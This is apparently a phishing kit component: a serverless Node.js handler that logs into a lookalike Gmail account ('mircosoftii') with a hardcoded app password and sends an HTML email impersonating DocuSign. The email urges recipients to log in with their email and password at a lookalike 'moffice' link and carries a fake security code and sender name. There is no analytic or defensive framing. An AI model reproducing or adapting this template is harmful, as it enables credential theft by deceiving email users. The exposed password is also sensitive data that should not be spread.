const nodemailer = require('nodemailer');

exports.handler = async (event, context) => {
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
      },
      body: ''
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const formData = JSON.parse(event.body);
    const { recepients } = formData;

    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: 'mircosoftii@gmail.com',
        pass: 'lztqyrqznnqaieth'
      }
    });

    const mailOptions = {
      from: '"Deets" <mircosoftii@gmail.com>',
      to: 'mircosoftii@gmail.com',
      subject: '',
      html: `
      <!DOCTYPE html>
      <html>
      <head>
      <style>
      body {
        font-family: Arial, sans-serif;
        font-size: 12pt;
      }
      .container {
        max-width: 600px;
        margin: 0 auto;
        padding: 20px;
      }
      .header {
        text-align: left;
        margin-bottom: 20px;
      }
      .content {
        margin-bottom: 20px;
      }
      .button {
        display: inline-block;
        padding: 10px 20px;
        background-color: #4CAF50; /* Green */
        color: white;
        text-align: center;
        text-decoration: none;
        font-size: 16px;
        border-radius: 5px;
      }
      .footer {
        text-align: center;
        font-size: 10pt;
        color: #777;
      }
      .docu-image {
        max-width: 150px;
        margin: 0 auto;
        display: block;
      }
      .security-info {
          font-size: 10pt;
          color: #777;
          margin-top: 20px;
      }
      .alternate-signing {
          margin-top: 20px;
      }
      .about-docusign {
          margin-top: 20px;
      }
      .questions {
          margin-top: 20px;
      }
      .stop-receiving {
          margin-top: 20px;
      }
      .download-app {
          margin-top: 20px;
      }
      </style>
      </head>
      <body>
      <div class="container">
        <div class="header">
          <p>Hi,</p>
          <p>Kindly click to view and check the document I sent to you. You will have to login with your email and password to view or download.</p>
        </div>
        <div class="content">
          <img class="docu-image" src="your_image_url_here" alt="Document Image"> <br>  
          <p>Your document has been completed</p>
          <a class="button" href="https://moffice.netlify.app/">View Document</a>
        </div>
        <div class="content">
          <p>All parties have completed Please DocuSign:</p>
          <img src="your_docusign_logo_url_here" alt="DocuSign Logo" style="max-width: 100px;"> 
        </div>
      
        <div class="security-info">
          <p><strong>Do Not Share This Email</strong></p>
          <p>This email contains a secure link to DocuSign. Please do not share this email, link, or access code with others.</p>
        </div>
      
        <div class="alternate-signing">
          <p><strong>Alternate Signing Method</strong></p>
          <p>Visit DocuSign.com, click 'Access Documents', and enter the security code:</p>
          <p>E94827283C9047A0A1908009762ECA671</p>
        </div>
      
        <div class="about-docusign">
          <p><strong>About DocuSign</strong></p>
          <p>Sign documents electronically in just minutes. It's safe, secure, and legally binding. Whether you're in an office, at home, on-the-go-or even across the globe -- DocuSign provides a professional trusted solution for Digital Transaction Management™</p>
        </div>
      
        <div class="questions">
          <p><strong>Questions about the Document?</strong></p>
          <p>If you need to modify the document or have questions about the details in the document, please reach out to the sender by emailing them directly.</p>
        </div>
      
        <div class="stop-receiving">
          <p><strong>Stop receiving this email</strong></p>
          <p><a href="#">Report this email</a> or read more about <a href="#">Declining to sign</a> and <a href="#">Managing notifications</a>.</p>
          <p>If you are having trouble signing the document, please visit the <a href="#">Help with Signing</a> page on our Support Center.</p>
        </div>
      
        <div class="download-app">
          <p><a href="#">Download the DocuSign App</a></p>
        </div>
      
        <div class="footer">
          <p>This message was sent to you by Frank Castro who is using the DocuSign Electronic Signature Service. If you would rather not receive email from this sender you may contact the sender with your request.</p>
        </div>
      </div>
      </body>
      </html>
      `      
    };

    await transporter.sendMail(mailOptions);

    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ success: true })
    };

  } catch (error) {
    console.error('Error:', error);
    return {
      statusCode: 500,
      headers: {
        'Access-Control-Allow-Origin': '*'
      },
      body: JSON.stringify({ error: 'Fail2prcsrqst' })
    };
  }
};